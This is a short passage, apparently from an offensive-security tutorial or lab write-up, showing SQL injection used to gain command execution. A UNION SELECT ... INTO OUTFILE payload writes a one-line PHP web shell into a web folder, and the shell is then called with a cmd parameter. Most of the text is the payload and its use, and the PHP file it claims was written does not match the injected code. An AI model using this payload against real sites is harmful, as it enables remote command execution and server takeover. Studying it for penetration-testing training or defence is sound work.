We'll issue the **UNION SELECT** SQL keywords to include a single PHP line into the first column and save it as **webshell.php** in a writable web folder.
```
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
```

The written PHP code file results in the following:
```
<? system($_REQUEST['cmd']); ?>
```

This PHP function will parse the statements included in the cmd parameter coming from HTTP REQUESTS.

We may gen an error but not so important. We can access the webshell from:
```
/tmp/webshell.php?cmd=id
```
